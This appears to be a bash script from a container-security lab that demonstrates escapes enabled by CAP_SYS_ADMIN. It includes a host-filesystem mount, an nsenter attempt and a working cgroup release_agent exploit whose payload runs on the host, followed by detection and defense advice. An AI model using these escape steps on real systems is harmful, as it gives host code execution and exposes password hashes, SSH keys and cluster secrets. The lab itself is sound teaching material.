#!/bin/bash

# Scenario 3: CAP_SYS_ADMIN Escape Demonstration
# This script demonstrates how CAP_SYS_ADMIN capability enables container escapes

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Helper functions
print_header() {
    echo -e "\n${BLUE}========================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}========================================${NC}\n"
}

print_step() {
    echo -e "${GREEN}[STEP]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

pause_for_effect() {
    echo
    read -p "Press Enter to continue..."
    echo
}

# Check if running as root or with Docker permissions
check_prerequisites() {
    print_header "Checking Prerequisites"
    
    if ! docker ps &>/dev/null; then
        print_error "Cannot connect to Docker daemon. Please ensure:"
        echo "  1. Docker is installed"
        echo "  2. Docker daemon is running"
        echo "  3. User has Docker permissions (or run with sudo)"
        exit 1
    fi
    
    print_step "Docker is available and running"
    print_step "Docker version: $(docker version --format '{{.Server.Version}}')"
}

# Demonstration 1: Show capability comparison
demo_capability_comparison() {
    print_header "Demo 1: Capability Comparison"
    
    echo "Let's compare capabilities across different container configurations..."
    echo
    
    print_step "1. Normal container (limited capabilities)"
    docker run --rm alpine sh -c "apk add --no-cache libcap >/dev/null 2>&1 && capsh --print" | grep "Current:"
    echo
    
    print_step "2. Container with CAP_SYS_ADMIN"
    docker run --rm --cap-add=SYS_ADMIN alpine sh -c "apk add --no-cache libcap >/dev/null 2>&1 && capsh --print" | grep "Current:"
    echo
    
    print_step "3. Privileged container (ALL capabilities)"
    docker run --rm --privileged alpine sh -c "apk add --no-cache libcap >/dev/null 2>&1 && capsh --print" | grep "Current:"
    echo
    
    print_warning "Notice: CAP_SYS_ADMIN adds significant power, though not as much as privileged mode"
    pause_for_effect
}

# Demonstration 2: Host filesystem mount attack
demo_filesystem_mount() {
    print_header "Demo 2: Host Filesystem Mount Attack"
    
    print_step "Starting container with CAP_SYS_ADMIN..."
    docker run -dit --name sys-admin-escape --cap-add=SYS_ADMIN alpine sh
    sleep 2
    
    print_step "Inside the container, we'll mount the host filesystem..."
    echo
    
    # Find a host block device
    print_step "Finding host block devices..."
    docker exec sys-admin-escape ls -l /dev/ | grep -E "sd|vd|nvme" | head -3 || true
    echo
    
    print_warning "Attempting to mount host filesystem..."
    echo
    
    # Create mount point and attempt mount
    docker exec sys-admin-escape sh -c "
        mkdir -p /host 2>/dev/null
        
        # Try to find and mount host filesystem
        # Note: This may fail if /dev/sda1 doesn't exist, but concept is demonstrated
        DEVICE=\$(ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null | grep -E '(sda1|vda1|nvme0n1p1)' | head -1)
        
        if [ -n \"\$DEVICE\" ]; then
            echo \"Found device: \$DEVICE\"
            echo \"Attempting mount...\"
            mount \$DEVICE /host 2>/dev/null && echo \"✓ Mount successful!\" || echo \"✗ Mount failed (may not have permission on this host)\"
            
            if mount | grep -q '/host'; then
                echo \"\"
                echo \"HOST FILESYSTEM ACCESS:\"
                ls -la /host/ | head -10
                echo \"...\"
                echo \"\"
                echo \"🚨 CRITICAL: We now have READ/WRITE access to the host filesystem!\"
                echo \"\"
                echo \"Could access sensitive files:\"
                echo \"  - /host/etc/shadow (password hashes)\"
                echo \"  - /host/root/.ssh/id_rsa (SSH keys)\"
                echo \"  - /host/etc/passwd (user accounts)\"
                echo \"  - /host/var/lib/kubelet/pods (Kubernetes secrets)\"
            fi
        else
            echo \"No suitable block device found for demonstration\"
            echo \"(This is common in containerized environments)\"
            echo \"\"
            echo \"In a real host environment, this would succeed and provide full host access\"
        fi
    "
    
    echo
    print_warning "Cleaning up demo container..."
    docker stop sys-admin-escape >/dev/null 2>&1
    docker rm sys-admin-escape >/dev/null 2>&1
    
    pause_for_effect
}

# Demonstration 3: Namespace manipulation
demo_namespace_manipulation() {
    print_header "Demo 3: Namespace Manipulation Attack"
    
    print_step "Starting container with CAP_SYS_ADMIN..."
    docker run -dit --name namespace-escape --cap-add=SYS_ADMIN alpine sh
    sleep 2
    
    print_step "Installing required tools..."
    docker exec namespace-escape sh -c "apk add --no-cache util-linux >/dev/null 2>&1"
    
    print_step "Listing current container namespaces..."
    docker exec namespace-escape ls -la /proc/self/ns/
    echo
    
    print_step "Attempting to enter host namespaces using nsenter..."
    echo
    
    docker exec namespace-escape sh -c "
        echo \"Current container's PID namespace:\"
        ls -l /proc/self/ns/pid
        echo \"\"
        
        echo \"Attempting to enter host PID namespace (PID 1):\"
        echo \"Command: nsenter --target 1 --mount --uts --ipc --net --pid ps aux\"
        echo \"\"
        
        # This will fail with just CAP_SYS_ADMIN (needs more), but demonstrates the attempt
        nsenter --target 1 --mount --uts --ipc --net --pid ps aux 2>&1 | head -10 || {
            echo \"\"
            echo \"⚠️  Namespace entry blocked by additional protections\"
            echo \"   (This specific technique requires more than just CAP_SYS_ADMIN)\"
            echo \"   However, CAP_SYS_ADMIN enables many other namespace manipulations:\"
            echo \"   - Creating new namespaces\"
            echo \"   - Modifying namespace configurations\"
            echo \"   - Accessing namespace-related files\"
        }
    "
    
    echo
    print_warning "Cleaning up demo container..."
    docker stop namespace-escape >/dev/null 2>&1
    docker rm namespace-escape >/dev/null 2>&1
    
    pause_for_effect
}

# Demonstration 4: Cgroup release_agent exploit
demo_cgroup_escape() {
    print_header "Demo 4: Cgroup Release Agent Exploit"
    
    print_warning "This demonstrates the famous Felix Wilhelm container escape technique"
    echo
    
    print_step "Starting container with CAP_SYS_ADMIN..."
    docker run -dit --name cgroup-escape --cap-add=SYS_ADMIN alpine sh
    sleep 2
    
    print_step "Executing the cgroup release_agent exploit..."
    echo
    
    docker exec cgroup-escape sh -c "
        echo \"Step 1: Creating and mounting a cgroup\"
        mkdir -p /tmp/cgrp
        mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null && echo \"✓ Cgroup mounted\" || echo \"✗ Mount failed\"
        
        echo \"\"
        echo \"Step 2: Enabling notify_on_release\"
        echo 1 > /tmp/cgrp/notify_on_release 2>/dev/null && echo \"✓ notify_on_release enabled\" || echo \"✗ Failed to enable\"
        
        echo \"\"
        echo \"Step 3: Finding host filesystem path\"
        host_path=\$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab 2>/dev/null | head -1)
        if [ -n \"\$host_path\" ]; then
            echo \"✓ Host path found: \$host_path\"
        else
            echo \"✗ Could not determine host path\"
            host_path=\"/tmp\"
        fi
        
        echo \"\"
        echo \"Step 4: Creating payload\"
        cat > /cmd.sh << 'EOF'
#!/bin/sh
# This script runs on the HOST when the cgroup exits
echo \"ESCAPED: This command is running on the host!\" > /tmp/escape-proof.txt
date >> /tmp/escape-proof.txt
EOF
        chmod +x /cmd.sh
        echo \"✓ Payload created\"
        
        echo \"\"
        echo \"Step 5: Setting release_agent to our payload\"
        echo \"\$host_path/cmd.sh\" > /tmp/cgrp/release_agent 2>/dev/null && echo \"✓ release_agent set\" || echo \"✗ Failed to set release_agent\"
        
        echo \"\"
        echo \"Step 6: Triggering the exploit\"
        echo \"Adding process to cgroup to trigger release_agent...\"
        sh -c \"echo \\\$\\\$ > /tmp/cgrp/cgroup.procs\" 2>/dev/null
        
        sleep 2
        
        echo \"\"
        echo \"Checking if exploit worked...\"
        if [ -f \"/tmp/escape-proof.txt\" ]; then
            echo \"\"
            echo \"🚨 CRITICAL: Exploit successful!\"
            echo \"Payload executed on HOST:\"
            cat /tmp/escape-proof.txt
            echo \"\"
            echo \"This proves we can execute arbitrary code on the host system!\"
        else
            echo \"\"
            echo \"⚠️  Exploit demonstration complete (may be blocked by container runtime protections)\"
            echo \"   In an unprotected environment, this would execute code on the host\"
        fi
    "
    
    echo
    print_warning "Cleaning up demo container..."
    docker stop cgroup-escape >/dev/null 2>&1
    docker rm cgroup-escape >/dev/null 2>&1
    
    # Cleanup any artifacts
    sudo rm -f /tmp/escape-proof.txt 2>/dev/null || true
    
    pause_for_effect
}

# Show detection methods
demo_detection() {
    print_header "Demo 5: Detection and Auditing"
    
    print_step "Creating a test pod with CAP_SYS_ADMIN for audit demonstration..."
    
    # Create a test container
    docker run -dit --name audit-test --cap-add=SYS_ADMIN alpine sh >/dev/null 2>&1
    sleep 1
    
    print_step "Auditing container capabilities..."
    echo
    
    echo "Container: audit-test"
    docker inspect audit-test | jq '.[0].HostConfig.CapAdd'
    echo
    
    print_step "Full capability listing:"
    docker exec audit-test sh -c "apk add --no-cache libcap >/dev/null 2>&1 && capsh --print" | grep "Current:"
    echo
    
    print_warning "In production, use the audit script to scan all containers:"
    echo "  ./artifacts/audit-sys-admin.sh"
    echo
    
    print_step "Cleaning up test container..."
    docker stop audit-test >/dev/null 2>&1
    docker rm audit-test >/dev/null 2>&1
    
    pause_for_effect
}

# Main execution
main() {
    clear
    
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║      Lab 09 - Scenario 3: CAP_SYS_ADMIN Escape Demo          ║
║                                                               ║
║  This demo shows how the CAP_SYS_ADMIN capability enables    ║
║  container escape attacks similar to --privileged mode.       ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    
    echo
    print_warning "⚠️  WARNING: This demonstration shows actual container escape techniques!"
    print_warning "   Only run this in a safe, isolated test environment."
    echo
    read -p "Do you want to continue? (yes/no): " confirm
    
    if [[ "$confirm" =~ ^[Yy](es)?$ ]]; then
        # Continue with demo
        :
    else
        echo "Demo cancelled."
        exit 0
    fi
    
    check_prerequisites
    
    # Run demonstrations
    demo_capability_comparison
    demo_filesystem_mount
    demo_namespace_manipulation
    demo_cgroup_escape
    demo_detection
    
    # Final summary
    print_header "Demo Complete - Summary"
    
    cat << EOF
${GREEN}What we demonstrated:${NC}

1. ${YELLOW}Capability Comparison${NC}
   - CAP_SYS_ADMIN adds significant privileges
   - Not as many as --privileged, but enough to escape

2. ${YELLOW}Host Filesystem Mount${NC}
   - CAP_SYS_ADMIN allows mounting host block devices
   - Full read/write access to host filesystem
   - Can access /etc/shadow, SSH keys, Kubernetes secrets

3. ${YELLOW}Namespace Manipulation${NC}
   - Can create and modify namespaces
   - Attempts to break out of container isolation
   - Various namespace-related exploits possible

4. ${YELLOW}Cgroup Exploit${NC}
   - Classic Felix Wilhelm technique
   - Uses cgroup release_agent to execute code on host
   - Demonstrates code execution outside container

5. ${YELLOW}Detection Methods${NC}
   - How to audit for CAP_SYS_ADMIN
   - Inspection techniques
   - Automated scanning approaches

${RED}Key Takeaways:${NC}

• CAP_SYS_ADMIN ≈ --privileged for escape purposes
• Much harder to detect in security audits
• Often added for "legitimate" reasons (FUSE, VPN, etc.)
• Almost always has safer alternatives (CSI drivers, specific caps)
• Should be blocked by admission controllers
• Requires runtime monitoring (Falco) if used

${GREEN}Defense Strategies:${NC}

1. Default: Drop ALL capabilities
2. Add only specific safe capabilities (NET_BIND_SERVICE, etc.)
3. Use alternatives: CSI drivers instead of FUSE, NET_ADMIN instead of SYS_ADMIN
4. Block at admission: Kyverno/OPA policies
5. Monitor at runtime: Falco rules
6. Regular audits: Scan for CAP_SYS_ADMIN usage

${BLUE}Next Steps:${NC}

1. Run ./defense.sh to implement protections
2. Review artifacts/kyverno-block-sys-admin.yaml
3. Deploy Falco rules from artifacts/falco-sys-admin-rules.yaml
4. Audit your cluster: ./artifacts/audit-sys-admin.sh
5. Replace CAP_SYS_ADMIN with safer alternatives

${BLUE}Documentation:${NC}
Full details in README.md

${BLUE}Cleanup:${NC}
Run ./cleanup.sh to remove all demo artifacts
EOF
    
    echo
}

# Run main function
main "$@"